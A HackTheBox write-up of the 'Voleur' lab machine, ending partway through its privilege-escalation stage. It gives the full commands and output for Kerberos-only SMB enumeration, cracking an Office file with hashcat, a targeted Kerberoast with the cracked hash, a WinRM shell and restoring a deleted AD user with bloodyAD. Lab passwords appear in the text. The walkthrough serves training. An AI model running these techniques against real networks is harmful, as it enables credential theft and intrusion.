---
title: "HTB - Voleur Writeup"
date: 2026-11-20 09:22:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
Voleur is a medium-difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment, and NTLM authentication is disabled. After Kerberos configuration and network enumeration, a password-protected Excel file is found on an exposed SMB share. We extract its password hash, crack it to recover the password, and use that password to access the spreadsheet. Enumeration reveals a service account with WriteSPN rights, which enables a targeted Kerberoasting attack that recovers credentials and grants remote access to the host. A previously deleted domain user is restored using group privileges, and a DPAPI-protected credential blob is recovered, which is decrypted with the user’s password to reveal a higher-privilege account. These credentials lead to discovering an SSH private key for a backup service account, allowing access to a Linux subsystem over a nonstandard port. From this, the NTDS.dit, SYSTEM, and SECURITY backup files are extracted and used to recover the Administrator's NT hash, ultimately allowing access as the Administrator.
## P0
First of all, we will use rustscan to find out all opened ports of this machine:
```
└─$ rustscan -a 10.129.232.130 -b 100 --ulimit 500 --scan-order "serial" --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 500.
Open 10.129.232.130:53
Open 10.129.232.130:88
Open 10.129.232.130:135
Open 10.129.232.130:139
Open 10.129.232.130:389
Open 10.129.232.130:445
Open 10.129.232.130:464
Open 10.129.232.130:593
Open 10.129.232.130:636
Open 10.129.232.130:2222
Open 10.129.232.130:3269
Open 10.129.232.130:3268
Open 10.129.232.130:5985
Open 10.129.232.130:9389
Open 10.129.232.130:49664
Open 10.129.232.130:49668
Open 10.129.232.130:56510
Open 10.129.232.130:58485
Open 10.129.232.130:58486
Open 10.129.232.130:58488
Open 10.129.232.130:58511
10.129.232.130 -> [53,88,135,139,389,445,464,593,636,2222,3269,3268,5985,9389,49664,49668,56510,58485,58486,58488,58511]

```
Next, I will use nmap to get more details information about those opened ports:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,88,135,139,389,445,464,593,636,2222,3269,3268,5985,9389,49664,49668,56510,58485,58486,58488,58511 -oN 10.129.232.130_nmap 10.129.232.130
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-19 21:40 -0500
Nmap scan report for 10.129.232.130 (10.129.232.130)
Host is up (0.055s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-20 10:38:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56510/tcp open  msrpc         Microsoft Windows RPC
58485/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58486/tcp open  msrpc         Microsoft Windows RPC
58488/tcp open  msrpc         Microsoft Windows RPC
58511/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-11-20T10:39:40
|_  start_date: N/A
|_clock-skew: 7h58m29s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 58488/tcp)
HOP RTT      ADDRESS
1   56.84 ms 10.10.14.1 (10.10.14.1)
2   56.90 ms 10.129.232.130 (10.129.232.130)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.95 seconds
```
## P1
Firstly, from nmap result, we realize this machine has active directory signature :D. So we will add its domain to `/etc/hosts`:
```
└─$ cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.232.130 voleur.htb
```
Now, we will first look at `port 53`:
```
└─$ dig NS voleur.htb @10.129.232.130       

; <<>> DiG 9.20.23-1-Debian <<>> NS voleur.htb @10.129.232.130
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53037
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;voleur.htb.                    IN      NS

;; ANSWER SECTION:
voleur.htb.             3600    IN      NS      dc.voleur.htb.

;; ADDITIONAL SECTION:
dc.voleur.htb.          3600    IN      A       10.129.232.130

;; Query time: 60 msec
;; SERVER: 10.129.232.130#53(10.129.232.130) (UDP)
;; WHEN: Thu Nov 19 22:07:10 EST 2026
;; MSG SIZE  rcvd: 72
```
Wow, continue to add `dc.voleur.htb` to `/etc/hosts`
```
└─$ cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.232.130 voleur.htb dc.voleur.htb
```
We move to SMB service on `port 445`:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt'         
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```
This machine seems to block NLTM Authentication, so we change to Kerberos authentication:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Enumerated shares
SMB         10.129.232.130  445    DC               Share           Permissions            Remark
SMB         10.129.232.130  445    DC               -----           -----------            ------
SMB         10.129.232.130  445    DC               ADMIN$                                 Remote Admin
SMB         10.129.232.130  445    DC               C$                                     Default share
SMB         10.129.232.130  445    DC               Finance                                
SMB         10.129.232.130  445    DC               HR                                     
SMB         10.129.232.130  445    DC               IPC$            READ                   Remote IPC
SMB         10.129.232.130  445    DC               IT              READ                   
SMB         10.129.232.130  445    DC               NETLOGON        READ                   Logon server share 
SMB         10.129.232.130  445    DC               SYSVOL          READ                   Logon server share 
```
Great sign, we have `READ` permisson on `IT` share. So we can use `nxc smb` to enumerate it:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --spider 'IT' --pattern '.'
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Spidering .
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/.. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/.. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-29 18:23' size:16896]
```
Next we will download `Access_Review.xlsx` to our local attack host and read it:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --share 'IT' --get-file '/First-Line Support/Access_Review.xlsx' 'Access_review.xlsx'
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Copying '/First-Line Support/Access_Review.xlsx' to 'Access_review.xlsx'
SMB         10.129.232.130  445    DC               [+] File '/First-Line Support/Access_Review.xlsx' was downloaded to 'Access_review.xlsx'
```
Unfortunately, this file has password blocked. So we must find out its password:

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_11-35.png){: w="700" }

Okey, a password, so I fastly think to `hashcat` :D. But first of all we need to convert that password to a format which hascat can understand. I will use `office2john` tool:
```
└─$ office2john Access_review.xlsx                                                
Access_review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```
```
.\hashcat.exe -a 0 -m 9600 '$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c' ..\own-wordlist\rockyou.txt
```
```
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_12-23.png){: w="700" }

## P2
`As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt`<br>

At this present, this machine gives us a valid credential `ryan.naylor / HollowOct31Nyt`. So we can start `rusthound` first to gather available AD information:
```
└─$ rusthound-ce -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -z        

---------------------------------------------------
Initializing RustHound-CE at 21:48:37 on 11/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-20T02:48:37Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-20T02:48:37Z INFO  rusthound_ce] Collection method: All
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Connected to VOLEUR.HTB Active Directory!
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:41Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=voleur,DC=htb
[2026-11-20T02:48:41Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:43Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=voleur,DC=htb
[2026-11-20T02:48:43Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 37%                                                                                                                                                                  [2026-11-20T02:48:43Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                                                           
[2026-11-20T02:48:43Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 5 ous parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] .//20261119214843_voleur-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 21:48:43 on 11/19/26! Happy Graphing!
```
Cool ! Now import all rusthound result to bloodhound GUI and start your detective job !

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_15-04.png){: w="700" }

```
└─$ nxc smb 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k 
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```
From the result of Bloodhound we realize that `svc_ldap` user have `WriteSPN` permission on `svc_winrm` user. So we can use `nxc ldap` to run a kerberoasting attack for user `svc_winrm`:
```
└─$ nxc ldap 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --targeted-kerberoast 'svc_winrm' --kerberoast svc_winrm_st
LDAP        10.129.232.130  389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.232.130  389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        10.129.232.130  389    DC               [+] Found 1 enabled users without SPN.
LDAP        10.129.232.130  389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2025-01-29 10:07:32.711487
LDAP        10.129.232.130  389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455
```
Now is the task of `hashcat`. We will use it to decrypt and find out the clear text of `svc_winrm` password
```
.\hashcat.exe -a 0 -m 13100 '$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455' ..\own-wordlist\rockyou.txt
```
```
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455:AFireInsidedeOzarctica980219afi
```
```
└─$ nxc smb 10.129.232.130 -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -k
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```
Great!!, this password is valid. Now we can use it with `evil-winrm` to get an initial shell. But NTLM authentication is disabled, so we need to use `impacket-getTGT` to get TGT first:
```
└─$ impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```
Now we can use `evil-winrm` to achieve our purpose:
```
└─$ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -K svc_winrm.ccache -r VOLEUR.HTB
                                        
Evil-WinRM shell v3.9
                                        
Warning: KRB5CCNAME is already set to: /home/kali/htb/svc_winrm.ccache. Using existing value instead of /home/kali/htb/svc_winrm.ccache
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
```
And we get the first flag:
```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---        11/20/2026   2:20 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
```
## P3 & P4
Okey now we have an initial shell. I have tried to run my own script as well as winPEAS script but nothing interesting here. So I try to come back to with `Access_review.xlsx` file. From here we can see that there is a deleted account name `todd.wolfe` with its reseted password `NightT1meP1dg3on14`. So we can restore it by using `bloodyAD` like below:

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-24_20-42.png){: w="700" }

```
└─$ bloodyAD --host dc.voleur.htb --dc-ip 10.129.232.130 -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k ccache=svc_ldap.ccache set restore 'todd.wolfe'
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```
```
└─$ nxc smb 10.129.73.122 -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k
SMB         10.129.73.122   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.73.122   445    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```
Great, I continue check whether any shares availabe when using `todd.wolfe` user:
```
└─$ nxc smb 10.129.73.122 -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k --spider "IT" --regex "." 
SMB         10.129.73.122   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.73.122   445    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
SMB         10.129.73.122   445    DC               [*] Spidering .
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/3D Objects [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/AppData [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Contacts [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Desktop [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Documents [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Downloads [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Favorites [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Links [dir]
